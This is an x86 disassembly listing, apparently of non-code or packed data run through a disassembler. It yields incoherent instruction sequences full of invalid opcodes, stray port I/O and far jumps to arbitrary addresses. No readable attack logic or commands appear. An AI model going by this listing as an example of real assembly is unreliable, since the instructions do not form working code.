  428b4f:	fwait
  428b50:	xchg   DWORD PTR [esi-0x76c591c7],ebp
  428b56:	aam    0x3c
  428b58:	adc    BYTE PTR ds:0x4d6e7c22,al
  428b5e:	cmp    al,0xe4
  428b60:	mov    al,0x3
  428b62:	mov    cs,ebp
  428b64:	mov    esi,ebp
  428b66:	mul    DWORD PTR ds:0xe76b0d7e
  428b6c:	jmp    DWORD PTR [edx-0x6b0863ac]
  428b72:	add    DWORD PTR [ecx+ebp*4+0x51],ecx
  428b76:	ja     0x428b27
  428b78:	mov    esi,0xcc546a04
  428b7d:	mov    ds:0x9ff2ba86,eax
  428b82:	shl    DWORD PTR [eax-0x3829baa5],0xd6
  428b89:	imul   ebx,esp,0xffffffb3
  428b8c:	pop    ss
  428b8d:	mov    ds:0x10b113,al
	...
  428bf2:	add    BYTE PTR [eax],al
  428bf4:	lds    edx,FWORD PTR [ebp-0x76]
  428bf7:	cli    
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x1906d2b7
  428c04:	xor    dh,BYTE PTR [ecx+eax*1+0x10500]
  428c0b:	add    BYTE PTR [ebx-0x755d07ba],bl
  428c11:	xchg   esi,eax
  428c12:	mov    bh,0xfb
  428c14:	mov    ds:0xc62f611f,al
  428c19:	dec    edi
  428c1a:	sbb    DWORD PTR [ebp-0x41],0xffffffc1
  428c1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c1f:	in     eax,0x81
  428c21:	jg     0x428bf6
  428c23:	mov    eax,ds:0x2a0727b5
  428c28:	adc    dh,BYTE PTR ds:0xf514ce34
  428c2e:	das    
  428c2f:	rol    DWORD PTR [ecx+0x12],1
  428c32:	mov    cl,0xc2
  428c34:	jmp    0x428c9c
  428c36:	repz mov edi,0x37f15cc4
  428c3c:	push   es
  428c3d:	mov    ah,0x49
  428c3f:	in     eax,0x86
  428c41:	(bad)  
  428c43:	aad    0x8b
  428c45:	pop    eax
  428c46:	jmp    0xc7b6:0x4b95d974
  428c4d:	inc    ebp
  428c4e:	sbb    al,0xbc
  428c50:	dec    ecx
  428c51:	jge    0x428c0c
  428c53:	jecxz  0x428c42
  428c55:	retf   0x2a83
  428c58:	or     DWORD PTR [ebp-0x521b1cdb],edi
  428c5e:	test   DWORD PTR [eax],0xb5521938
  428c64:	mov    bl,0x7a
  428c66:	sahf   
  428c67:	sti    
  428c68:	rcr    esi,1
  428c6a:	inc    edi
  428c6b:	push   esi
  428c6c:	rcr    BYTE PTR [edi-0x324b102],0xa1
  428c73:	dec    ecx
  428c74:	sbb    BYTE PTR [ebp-0x509fcf6f],bh
  428c7a:	mov    ah,0x90
  428c7c:	test   DWORD PTR [esp+ebx*2],ebx
  428c7f:	mov    dl,al
  428c81:	or     DWORD PTR [ecx],0x22
  428c84:	cmp    cl,0xd0
  428c87:	sbb    al,BYTE PTR [ecx+edi*2-0x1d]
  428c8b:	inc    ebp
  428c8c:	sti    
  428c8d:	dec    edx
  428c8e:	sbb    edx,DWORD PTR [ebx+0x36cb02b5]
  428c94:	add    ebx,DWORD PTR [esi-0x7737866]
  428c9a:	cwde   
  428c9b:	mov    ecx,0x22610358
  428ca0:	adc    BYTE PTR [esi],ah
  428ca2:	int3   
  428ca3:	sbb    BYTE PTR [edx-0x3f0f92f3],0x19
  428caa:	jne    0x428ccb
  428cac:	test   DWORD PTR [edi+0x1e],ebx
  428caf:	stc    
  428cb0:	and    DWORD PTR [ecx+0x1c],ebx
  428cb3:	xlat   BYTE PTR ds:[ebx]
  428cb4:	lahf   
  428cb5:	xchg   esi,eax
  428cb6:	(bad)  
  428cb7:	ds inc edi
  428cb9:	push   ecx
  428cba:	jecxz  0x428ced
  428cbc:	cli    
  428cbd:	xchg   BYTE PTR [edx-0x71a935d1],al
  428cc3:	fadd   DWORD PTR [edi]
  428cc5:	xor    cl,BYTE PTR [ebx]
  428cc7:	int    0xf2
  428cc9:	jnp    0x428cc0
  428ccb:	(bad)  
  428ccc:	lds    edi,FWORD PTR [ecx-0x19e8de7d]
  428cd2:	xor    eax,0x2be1d4bd
  428cd7:	push   esi
  428cd8:	mov    WORD PTR [eax-0x3a],es
  428cdb:	mov    esp,0x84ebc737
  428ce0:	retf   0x5d61
  428ce3:	mov    dl,0x78
  428ce5:	pop    esp
  428ce6:	sub    DWORD PTR [edx-0x1f],ebp
  428ce9:	xchg   BYTE PTR [eax+0x4b],al
  428cec:	sbb    cl,BYTE PTR [ecx]
  428cee:	fst    DWORD PTR [eax-0x4da58c90]
  428cf4:	(bad)  
  428cf5:	xchg   bh,bl
  428cf7:	mov    eax,0x728353e
  428cfc:	push   ebx
  428cfd:	cmp    ebx,ebp
  428cff:	add    al,0xbd
  428d01:	fwait
  428d02:	scas   eax,DWORD PTR es:[edi]
  428d03:	push   esi
  428d04:	push   ebx
  428d05:	sub    DWORD PTR [eax-0x164cf91b],edx
  428d0b:	mov    BYTE PTR [edx],cl
  428d0d:	or     eax,DWORD PTR [ebx+eiz*4-0x3d]
	...
  428d71:	add    BYTE PTR [eax],al
  428d73:	add    BYTE PTR [ecx-0xace0e4b],al
  428d79:	jne    0x428d3c
  428d7b:	mov    ch,0x90
  428d7d:	int3   
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0x9ecd
  428d82:	(bad)  
  428d83:	popa   
  428d84:	aaa    
  428d85:	mov    ch,0x1
  428d87:	add    BYTE PTR ds:0x85000001,al
  428d8d:	mov    ecx,0xeaccc959
  428d92:	cmp    ch,ah
  428d94:	int    0x69
  428d96:	inc    ecx
  428d97:	sub    bl,BYTE PTR [ecx+0x5c50ce0d]
  428d9d:	dec    eax
  428d9e:	cmc    
  428d9f:	jae    0x428df7
  428da1:	dec    esp
  428da2:	ret    0x76f5
  428da5:	xchg   ecx,eax
  428da6:	sub    BYTE PTR [esi+0x49],0x75
  428daa:	mov    edx,0x8b21d00d
  428daf:	and    DWORD PTR [esi],edx
  428db1:	outs   dx,DWORD PTR ds:[esi]
  428db2:	push   ebx
  428db3:	ret    
  428db4:	adc    ah,BYTE PTR [eax+0x1d]
  428db7:	cmp    BYTE PTR [edi+0x78],0x78
  428dbb:	(bad)  
  428dbd:	mov    ecx,esp
  428dbf:	or     DWORD PTR [edx-0x28],esp
  428dc2:	imul   ecx,DWORD PTR [ebx-0x32],0x9bf5c242
  428dc9:	test   al,0xda
  428dcb:	xchg   esi,eax
  428dcc:	mov    dh,0x64
  428dce:	jnp    0x428de3
  428dd0:	std    
  428dd1:	shr    DWORD PTR [ecx+0x47fd6b23],0xcb
  428dd8:	retf   
  428dd9:	in     eax,dx
  428dda:	lods   eax,DWORD PTR ds:[esi]
  428ddb:	stc    
  428ddc:	test   eax,0xe9495cba
  428de1:	outs   dx,BYTE PTR ds:[esi]
  428de2:	rol    BYTE PTR [ebp+0x43bb37d5],0xd3
  428de9:	or     bl,BYTE PTR [ecx]
  428deb:	push   ebp
  428dec:	add    BYTE PTR [edi],ch
  428dee:	jmp    0x428d73
  428df0:	add    DWORD PTR [esi],0x49
  428df3:	sbb    DWORD PTR [ebp+0x2f],ebp
  428df6:	rcr    BYTE PTR [edx],1
  428df8:	aam    0x7e
  428dfa:	outs   dx,BYTE PTR ds:[esi]
  428dfb:	lds    ebp,FWORD PTR [esi+edx*2-0x15]
  428dff:	xchg   esi,eax
  428e00:	popf   
  428e01:	pop    ecx
  428e02:	push   cs
  428e03:	mov    DWORD PTR [ebx*1+0xb47b81d],ecx
  428e0a:	iret   
  428e0b:	inc    ebx
  428e0c:	in     eax,dx
  428e0d:	jae    0x428da6
  428e0f:	test   DWORD PTR [ebp+0x67c08d4a],esi
  428e15:	inc    eax
  428e16:	pop    edi
  428e17:	es and al,0x8f
  428e1a:	clc    
  428e1b:	mov    ds:0x9aaa020a,al
  428e20:	out    dx,al
  428e21:	sbb    al,0xe3
  428e23:	adc    DWORD PTR [ebx+0x55],esp
  428e26:	mov    edi,0x6c8bdeb6
  428e2b:	sub    ecx,DWORD PTR [eax]
  428e2d:	fnsave [edi-0x4a]
  428e30:	jo     0x428e6c
  428e32:	out    dx,al
  428e33:	dec    esi
  428e34:	or     eax,0xc3c4a67c
  428e39:	pop    ebp
  428e3a:	clc    
  428e3b:	and    ebx,eax
  428e3d:	out    0xef,eax
  428e3f:	ret    0x990b
  428e42:	cwde   
  428e43:	shr    ch,1
  428e45:	sub    DWORD PTR [ecx],edi
  428e47:	adc    BYTE PTR [eax],bl
  428e49:	sbb    bh,ch
  428e4b:	xchg   BYTE PTR [eax-0x56],dl
  428e4e:	gs cdq 
  428e50:	adc    ebp,DWORD PTR [edi+0x26]
  428e53:	ret    0xc443
  428e56:	int    0x40
  428e58:	scas   al,BYTE PTR es:[edi]
  428e59:	icebp  
  428e5a:	cmp    edx,DWORD PTR [eax+0x4aef9463]
  428e60:	test   DWORD PTR [eax],edi
  428e62:	test   DWORD PTR [edi-0x7187845],ebp
  428e68:	(bad)  
  428e69:	jmp    0x8fb13fa4
  428e6e:	retf   
  428e6f:	xor    eax,0xb82b63fe
  428e74:	mov    ecx,0xee682bdc
  428e79:	pusha  
  428e7a:	adc    DWORD PTR [ebp-0x381268e9],eax
  428e80:	xor    eax,0x67154ae0
  428e85:	cli    
  428e86:	xchg   BYTE PTR [ebx+0x5c42c763],ah
  428e8c:	adc    esi,edi
  428e8e:	stc    
  428e8f:	mov    ds:0xbd,eax
	...
  428ef4:	dec    edi
  428ef5:	pop    ebp
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x7
  428f01:	mov    ds:0xb63cb8c8,eax
  428f06:	add    DWORD PTR [eax],eax
  428f08:	add    eax,0x19000001
  428f0d:	in     al,dx
  428f0e:	ret    0x98a9
  428f11:	mov    DWORD PTR [eax+0x38],edi
  428f14:	(bad)  
  428f15:	in     eax,0x0
  428f17:	scas   eax,DWORD PTR es:[edi]
  428f18:	add    al,ch
  428f1a:	nop
  428f1b:	or     ecx,esp
  428f1d:	aaa    
  428f1e:	loopne 0x428ec4
  428f20:	mov    al,0x79
  428f22:	sbb    ch,BYTE PTR [ecx-0x147a1a58]
  428f28:	js     0x428f84
  428f2a:	test   al,0xa4
  428f2c:	faddp  st(4),st
  428f2e:	push   ebx
  428f2f:	push   esp
  428f30:	aad    0x8c
  428f32:	sub    ebx,ecx
  428f34:	fs add eax,0x21edff44
  428f3a:	jb     0x428f2c
  428f3c:	xchg   BYTE PTR [edx-0x77],dh
  428f3f:	jno    0x428fc0
  428f41:	add    al,0x58
  428f43:	shl    DWORD PTR [edx],cl
  428f45:	adc    edi,DWORD PTR [edi-0x7b2ed6dc]
  428f4b:	push   ds
  428f4c:	out    dx,eax
  428f4d:	rol    BYTE PTR [edx-0x27ac9ec9],cl
  428f53:	xchg   ecx,eax
  428f54:	(bad)  
  428f55:	cmp    DWORD PTR [edi],esp
  428f57:	xchg   edx,eax
  428f58:	fistp  DWORD PTR [ebp+0x40775937]
  428f5e:	adc    eax,0x1c66e840
  428f63:	mov    BYTE PTR [eax+0x5306f1f4],cl
  428f69:	jbe    0x428fda
  428f6b:	or     DWORD PTR [ebp-0x8],eax
  428f6e:	jb     0x428f0f
  428f70:	sti    
  428f71:	sti    
  428f72:	cmc    
  428f73:	js     0x428fb0
  428f75:	stos   DWORD PTR es:[edi],eax
  428f76:	or     dl,BYTE PTR [eax+0x66069c59]
  428f7c:	out    dx,eax
  428f7d:	in     eax,0x8
  428f7f:	icebp  
  428f80:	sbb    DWORD PTR [ebx-0x23],ecx
  428f83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f84:	scas   al,BYTE PTR es:[edi]
  428f85:	xor    esp,esp
  428f87:	xor    BYTE PTR [ebp+0x6],cl
  428f8a:	jp     0x428fc4
  428f8c:	hlt    
  428f8d:	retf   
  428f8e:	test   BYTE PTR [ebx-0xa],0xfe
  428f92:	retf   
  428f93:	push   edi
  428f94:	fldcw  WORD PTR [edi-0x3c]
  428f97:	cs stc 
  428f99:	je     0x429013
  428f9b:	push   esi
  428f9c:	pop    ds
  428f9d:	mov    ebx,0xa6f6f66
  428fa2:	dec    edx
  428fa3:	add    ch,BYTE PTR [ebx+0x4a3f452e]
  428fa9:	mov    esi,0x74243fa6
  428fae:	lahf   
  428faf:	dec    ecx
  428fb0:	jmp    0x3a03:0xdb86e414
  428fb7:	inc    edi
  428fb8:	mov    eax,ds:0xa4157376
  428fbd:	stc    
  428fbe:	xchg   ebx,eax
  428fbf:	lds    eax,FWORD PTR [eax-0x7a34fcd3]
  428fc5:	addr16 push 0x34
  428fc8:	test   DWORD PTR [edx],ebx
  428fca:	div    edx
  428fcc:	mov    ds:0xc5af9947,eax
  428fd1:	int3   
  428fd2:	call   0xd1cf328f
  428fd7:	inc    ecx
  428fd8:	xor    esp,DWORD PTR [edx+0x55dbd16b]
  428fde:	jo     0x428faa
  428fe0:	je     0x428f68
  428fe2:	and    eax,0x9857c88c
  428fe7:	popf   
  428fe8:	fwait
  428fe9:	out    0xfa,eax
  428feb:	mov    al,0x3
  428fed:	pop    edi
  428fee:	mov    eax,0xb025d180
  428ff3:	out    dx,al
  428ff4:	push   esi
  428ff5:	mov    dl,0x73
  428ff7:	out    dx,al
  428ff8:	mov    ah,0x18
  428ffa:	outs   dx,DWORD PTR ds:[esi]
  428ffb:	daa    
  428ffc:	test   BYTE PTR [eax+0x2ff711ad],al
  429002:	or     eax,0xb6ef556a
  429007:	sahf   
  429008:	sbb    DWORD PTR [ebp+eiz*4+0x72897c71],ecx
  42900f:	add    al,0xf2
	...
  429071:	add    BYTE PTR [eax],al
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x3cfc7b77
  429081:	push   edx
  429082:	cs inc ebx
  429084:	inc    ecx
  429085:	mov    bh,0x1
  429087:	add    BYTE PTR ds:0x72000001,al
  42908d:	add    bh,BYTE PTR [esi]
  42908f:	push   esp
  429090:	add    ebp,DWORD PTR [edi]
  429092:	lds    edi,FWORD PTR [edi+0x53]
  429095:	inc    ebx
  429096:	pop    edx
  429097:	sub    bl,dl
  429099:	adc    DWORD PTR [esi-0x1],ebp
  42909c:	sub    al,0xb
  42909e:	and    esp,esp
  4290a0:	xchg   edx,eax
  4290a1:	loope  0x429025
  4290a3:	repnz int3 
  4290a5:	(bad)  
  4290a6:	in     al,dx
  4290a7:	sbb    BYTE PTR [ebp-0x5c],0x95
  4290ab:	sub    al,0x3b
  4290ad:	shr    BYTE PTR [esi],cl
  4290af:	sub    DWORD PTR [ebx-0x3f1b82e],eax
  4290b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4290b6:	push   ebp
  4290b7:	clc    
  4290b8:	hlt    
  4290b9:	mov    eax,ds:0xd98c6e8a
  4290be:	mov    DWORD PTR [edx],ecx
  4290c0:	jae    0x429120
  4290c2:	jp     0x42904b
  4290c4:	cmp    edi,DWORD PTR [ebp-0x40dcff16]
  4290ca:	retf   0x1c82
  4290cd:	adc    esp,esp
  4290cf:	jb     0x4290b2
  4290d1:	xchg   esp,eax
  4290d2:	push   edx
  4290d3:	cli    
  4290d4:	sahf   
  4290d5:	mov    ebx,0xc75b9c43
  4290da:	lahf   
  4290db:	and    esi,DWORD PTR [edx-0x4c]
  4290de:	imul   esi
  4290e0:	adc    BYTE PTR [ebx],0x64
  4290e3:	cmp    al,0xee
  4290e5:	fwait
  4290e6:	ss addr16 pop ebx
  4290e9:	dec    esp
  4290ea:	add    eax,0xfcd4b040
  4290ef:	ins    BYTE PTR es:[edi],dx
  4290f0:	mov    ch,dl
  4290f2:	pop    ebp
  4290f3:	mov    cs,WORD PTR [ebx+0x58]
  4290f6:	mov    DWORD PTR [ebx],esi
  4290f8:	lods   eax,DWORD PTR ds:[esi]
  4290f9:	lods   ax,WORD PTR ds:[esi]
  4290fb:	popf   
  4290fc:	loope  0x4290bb
  4290fe:	imul   esp,DWORD PTR [edi-0x1e],0x44
  429102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429103:	or     DWORD PTR [esi-0x28],edx
  429106:	push   edi
  429107:	(bad)  
  429108:	sbb    BYTE PTR [edi+0x4f6b80c8],dl
  42910e:	mov    BYTE PTR ds:0x8246d9fb,dl
  429114:	sbb    al,0xe9
  429116:	push   eax
  429117:	scas   eax,DWORD PTR es:[edi]
  429118:	add    edx,DWORD PTR [ecx-0x2e6c0c10]
  42911e:	push   ebx
  42911f:	add    BYTE PTR ds:0x3e8c880c,dh
  429125:	scas   eax,DWORD PTR es:[edi]
  429126:	jno    0x429150
  429128:	(bad)  
  429129:	pop    edi
  42912a:	sbb    DWORD PTR [ecx],eax
  42912c:	jb     0x429195
  42912e:	adc    dh,dh
  429130:	add    eax,0xec6c2fb4
  429135:	call   0x385a:0xc0109c7b
  42913c:	dec    esp
  42913d:	xor    ecx,0xffffff8c
  429140:	mov    ebp,0xc30456ab
  429145:	or     DWORD PTR [ebx],eax
  429147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429148:	xor    edi,eax
  42914a:	sar    dl,0x17
  42914d:	xchg   edi,eax
  42914e:	fcomp  QWORD PTR [edx+0x71]
  429151:	(bad)  
  429152:	outs   dx,BYTE PTR ds:[esi]
  429153:	fnstcw WORD PTR [ebp-0x9ff0527]
  429159:	sub    eax,0x36a1c826
  42915e:	mov    cs:0xb8daf417,eax
  429164:	inc    esi
  429165:	jbe    0x429180
  429167:	dec    esi
  429168:	jmp    0x9575:0x52fa16e1
  42916f:	cmp    ax,0x17d6
  429173:	jmp    0x45d0:0xc503c5af
  42917a:	cmp    al,0x7d
  42917c:	lds    ecx,FWORD PTR [eax-0x6d]
  42917f:	jo     0x429138
  429181:	sbb    al,0xb0
  429183:	mov    edi,DWORD PTR [edx-0x274c9452]
  429189:	jmp    0x42911a
  42918b:	sub    al,0x8d
  42918d:	test   eax,0x81c7f3
	...
  4291f2:	add    BYTE PTR [eax],al
  4291f4:	push   esi
  4291f5:	xchg   ebp,edi
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [esi+esi*4+0x46036700],0x50001b8
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [ecx-0x6e],bh
  42920e:	ins    DWORD PTR es:[edi],dx
  42920f:	cmp    DWORD PTR [esi],0x9d62839e
  429215:	idiv   BYTE PTR [eax]
  429217:	mov    ds:0xf90342a6,eax
  42921c:	ins    BYTE PTR es:[edi],dx
  42921d:	mov    BYTE PTR [ecx],dh
  42921f:	mov    ds:0x2444a2b2,eax
  429224:	idiv   BYTE PTR [edi+eax*2-0x31]
  429228:	dec    ebp
  429229:	mov    al,0xee
  42922b:	lahf   
  42922c:	(bad)  
  42922d:	jmp    0xa737a77c
  429232:	jmp    0xdd82:0x7a66ef0a
  429239:	inc    esi
  42923a:	(bad)  
  42923b:	adc    DWORD PTR ds:0x641a9a1c,edi
  429241:	clc    
  429242:	inc    ebx
  429243:	push   eax
  429244:	jo     0x4291f6
  429246:	cli    
  429247:	mov    dl,0x29
  429249:	xor    al,dl
  42924b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42924c:	nop
  42924d:	fs ins BYTE PTR es:[edi],dx
  42924f:	call   0xcd02b456
  429254:	call   0xf1d67ab1
  429259:	add    DWORD PTR [edx-0x5f],edx
  42925c:	ss sti 
  42925e:	mov    bl,0x1
  429260:	inc    ecx
  429261:	sbb    BYTE PTR fs:[esi],bh
  429264:	pop    ds
  429265:	sbb    esp,DWORD PTR [edx+0x184395b1]
  42926b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42926c:	mov    eax,0x223d64de
  429271:	xchg   edi,eax
  429272:	aam    0xf2
  429274:	cmp    eax,0xf82e3443
  429279:	mov    ebp,DWORD PTR [eax-0x6b]
  42927c:	mov    ch,0x18
  42927e:	mov    esp,0xd971fdbd
  429283:	cmp    al,0xd7
  429285:	pop    ss
  429286:	pop    esp
  429287:	and    BYTE PTR [edx+edi*8-0x2a],al
  42928b:	popa   
  42928c:	lahf   
  42928d:	mov    sp,WORD PTR [edx]
  429290:	adc    bh,BYTE PTR [ebp-0x3]
  429293:	mov    ch,0x26
  429295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429296:	push   ebp
  429297:	mov    ds:0x5a0aea84,eax
  42929c:	mov    esi,DWORD PTR [ebp-0x47147948]
  4292a2:	dec    ebx
  4292a3:	cs sbb al,0x15
  4292a6:	xor    al,0xa1
  4292a8:	pop    esp
  4292a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292aa:	mov    ebp,0x52bcdb03
  4292af:	data16 or al,0x17
  4292b2:	sub    eax,0x546e4e4
  4292b7:	sbb    ch,BYTE PTR ds:0x2cb04269
  4292bd:	inc    esi
  4292be:	jnp    0x42930f
  4292c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292c1:	jbe    0x4292b9
  4292c3:	push   eax
  4292c4:	sub    al,0xa5
  4292c6:	sub    eax,ecx
  4292c8:	and    BYTE PTR [ebp-0x16],dl
  4292cb:	(bad)  
  4292ce:	and    edi,DWORD PTR [ecx-0x6e]
  4292d1:	sbb    dh,bl
  4292d3:	retf   
  4292d4:	scas   al,BYTE PTR es:[edi]
  4292d5:	push   eax
  4292d6:	ficomp WORD PTR [edi+0x669146bc]
  4292dc:	mov    ecx,0x80db458c
  4292e1:	mov    dl,0xc6
  4292e3:	add    edi,DWORD PTR [ebx]
  4292e5:	push   0xc20f7b63
  4292ea:	test   eax,0x5dbce3c9
  4292ef:	mov    ds:0xf1412afc,eax
  4292f4:	and    ecx,DWORD PTR [esi+0x25049c8e]
  4292fa:	adc    al,0x8e
  4292fc:	adc    eax,0xef26676c
  429301:	xchg   edx,eax
  429302:	xchg   ebx,eax
  429303:	ds inc esp
  429305:	cli    
  429306:	jge    0x4292da
  429308:	ins    DWORD PTR es:[edi],dx
  429309:	adc    al,0x74
  42930b:	scas   eax,DWORD PTR es:[edi]
  42930c:	inc    ebp
  42930e:	sbb    eax,0x965c
	...
  429373:	add    al,dh
  429375:	adc    al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0x96
  429381:	(bad)  
  429382:	push   cs
  429383:	daa    
  429384:	dec    ebx
  429385:	mov    ecx,0x1050001
  42938a:	add    BYTE PTR [eax],al
  42938c:	retf   
  42938d:	repz das 
  42938f:	repz (bad) [ebx+0x7dc5f389]
  429396:	adc    BYTE PTR [ebp+0x4b2593aa],ah
  42939c:	sbb    al,0x23
  42939e:	add    DWORD PTR [ecx],ecx
  4293a0:	jne    0x4293d2
  4293a2:	push   0x22
  4293a4:	mov    edx,0x2a68b597
  4293a9:	push   ebp
  4293aa:	mov    edi,0x786d3960
  4293af:	adc    BYTE PTR [ebp-0x548b26cb],bh
  4293b5:	or     eax,DWORD PTR [bx+si-0x51]
  4293b9:	lods   al,BYTE PTR ds:[esi]
  4293ba:	xor    edi,ecx
  4293bc:	jo     0x42939b
  4293be:	mov    eax,0x8e3b060f
  4293c3:	jmp    0x42936e
  4293c5:	leave  
  4293c6:	loopne 0x4293f1
  4293c8:	ins    DWORD PTR es:[edi],dx
  4293c9:	scas   eax,DWORD PTR es:[edi]
  4293ca:	pop    esp
  4293cb:	lods   eax,DWORD PTR ds:[esi]
  4293cc:	add    bl,cl
  4293ce:	scas   eax,DWORD PTR es:[edi]
  4293cf:	inc    bp
  4293d1:	scas   al,BYTE PTR es:[edi]
  4293d2:	aam    0x69
  4293d4:	jge    0x4293b9
  4293d6:	and    al,0xa6
  4293d8:	jle    0x4293dd
  4293da:	test   DWORD PTR [edi-0x64bae824],ebx
  4293e0:	out    0x3e,al
  4293e2:	push   es
  4293e3:	test   al,0x79
  4293e5:	sbb    BYTE PTR [ecx+0x785160c1],ah
  4293eb:	(bad)  
  4293ec:	xchg   ecx,eax
  4293ed:	inc    eax
  4293ee:	clc    
  4293ef:	ror    BYTE PTR [edx+0x4c149f81],1
  4293f5:	mov    al,ds:0x1e30b55b
  4293fa:	enter  0x73ce,0x97
  4293fe:	xor    ax,0x73dd
  429402:	adc    dl,0x20
  429405:	scas   al,BYTE PTR es:[edi]
  429406:	pop    edi
  429407:	call   0x89110b5e
  42940c:	and    al,0xb7
  42940e:	sbb    bl,BYTE PTR [edx+0x21e2d53a]
  429414:	dec    eax
  429415:	popa   
  429416:	test   al,0x1e
  429418:	stos   DWORD PTR es:[edi],eax
  429419:	addr16 popa 
  42941b:	stos   DWORD PTR es:[edi],eax
  42941c:	lods   al,BYTE PTR ds:[esi]
  42941d:	out    0xb9,eax
  42941f:	or     dl,cl
  429421:	mov    esp,0x630544a7
  429426:	mov    ch,0x8d
  429428:	push   eax
  429429:	gs (bad) 
  42942c:	dec    edi
  42942d:	or     al,0xd5
  42942f:	lea    ebp,[eax+0x15]
  429432:	sub    esi,ebp
  429434:	xor    eax,0x7a2ae1e9
  429439:	fidiv  WORD PTR [ecx-0x6b]
  42943c:	sub    BYTE PTR [edx-0x18],0x2f
  429440:	mov    ch,0xaa
  429442:	mov    ebp,0xe7b09e97
  429447:	lods   eax,DWORD PTR ds:[esi]
  429448:	fild   WORD PTR [edi+0x47f5ce]
  42944e:	int3   
  42944f:	or     DWORD PTR [ebp-0x637b80d0],eax
  429455:	fisub  WORD PTR [ebp-0x9c83074]
  42945b:	lock push ds
  42945d:	mov    DWORD PTR [ebp-0x2b],edx
  429460:	xor    eax,0x4e85548
  429465:	lods   al,BYTE PTR ds:[esi]
  429466:	aaa    
  429467:	and    al,0xf1
  429469:	cmovae edi,edx
  42946c:	(bad)  [edi]
  42946e:	pushf  
  42946f:	ins    DWORD PTR es:[edi],dx
  429470:	pop    eax
  429471:	pushf  
  429472:	outs   dx,BYTE PTR ds:[esi]
  429473:	pop    ecx
  429474:	test   al,0xea
  429476:	dec    edi
  429477:	dec    esi
  429478:	pop    ebx
  429479:	xchg   esi,ebx
  42947b:	xor    DWORD PTR [ecx+0x3e],esp
  42947e:	(bad)  
  42947f:	in     eax,dx
  429480:	jge    0x429417
  429482:	out    dx,eax
  429483:	inc    eax
  429484:	retf   
  429485:	icebp  
  429486:	pop    ds
  429487:	lock movsx eax,BYTE PTR [eax+0x42]
  42948c:	mov    ch,0x7b
  42948e:	sub    ebx,DWORD PTR ds:0x26
	...
  4294f4:	dec    esp
  4294f5:	or     eax,0x3e532c13
  4294fa:	jg     0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0x2b8761ea],dx
  429503:	aas    
  429504:	push   eax
  429505:	mov    edx,0x1050001
  42950a:	add    BYTE PTR [eax],al
  42950c:	adc    ch,ah
  42950e:	mov    ch,0x9f
  429510:	xchg   edx,eax
  429511:	shl    BYTE PTR [ecx-0x31],1
  429514:	fdivr  st(5),st
  429516:	cmp    ecx,0x16
  429519:	adc    bl,BYTE PTR [ebp+edx*1-0x612e7888]
  429520:	mov    cl,ah
  429522:	adc    al,0x94
  429524:	jo     0x4294b8
  429526:	int    0xb2
  429528:	fwait
  429529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42952a:	sbb    BYTE PTR [ebp-0x37],bl
  42952d:	ins    DWORD PTR es:[edi],dx
  42952e:	out    0xf3,eax
  429530:	std    
  429531:	mov    dh,0xb9
  429533:	jo     0x429503
  429535:	adc    al,0x7f
  429537:	js     0x42950c
  429539:	jmp    0xcd:0x194e4111
  429540:	jae    0x429544
  429542:	sahf   
  429543:	(bad)  
  429544:	xor    eax,0x45e5f69d
  429549:	jo     0x42955a
  42954b:	xor    cl,BYTE PTR [eax*4-0x6f4bf202]
  429552:	sbb    DWORD PTR ds:0x983255f8,ebp
  429558:	mov    ds:0x1735ba11,al
  42955d:	cmc    
  42955e:	sub    BYTE PTR [eax+0x29],0x39
  429562:	jl     0x42951f
  429564:	jae    0x4295a7
  429566:	shr    cl,1
  429568:	loopne 0x4295c6
  42956a:	add    eax,0xbfdb061f
  42956f:	cmp    dl,bl
  429571:	ret    0xbd60
  429574:	sbb    al,ch
  429576:	push   ebx
  429577:	in     al,dx
  429578:	mov    dl,0xf3
  42957a:	mov    eax,0x16f8ec73
  42957f:	aas    
  429580:	fidiv  DWORD PTR [edi]
  429582:	mov    ds:0xf8b6c428,eax
  429587:	ins    DWORD PTR es:[edi],dx
  429588:	outs   dx,DWORD PTR ds:[esi]
  429589:	lahf   
  42958a:	xchg   DWORD PTR [esi+0x3f],ebp
  42958d:	data16 neg ah
  429590:	mov    al,ds:0xd62eaac
  429595:	push   ss
  429596:	push   cs
  429597:	std    
  429598:	mov    ch,0x8d
  42959a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42959b:	outs   dx,BYTE PTR ds:[esi]
  42959c:	popf   
  42959d:	jns    0x42960f
  42959f:	jne    0x42954f
  4295a1:	outs   dx,DWORD PTR ds:[esi]
  4295a2:	sbb    ch,BYTE PTR ds:0x7a67b742
  4295a8:	mov    dl,0x6a
  4295aa:	mov    ds:0xd002ff0b,al
  4295af:	test   BYTE PTR [edi-0x2e],dh
  4295b2:	sbb    eax,0xf8841c6b
  4295b7:	push   ebx
  4295b8:	cwde   
  4295b9:	sub    al,0x7b
  4295bb:	sbb    DWORD PTR ds:0x7b61254d,ecx
  4295c1:	aaa    
  4295c2:	cld    
  4295c3:	xchg   edx,eax
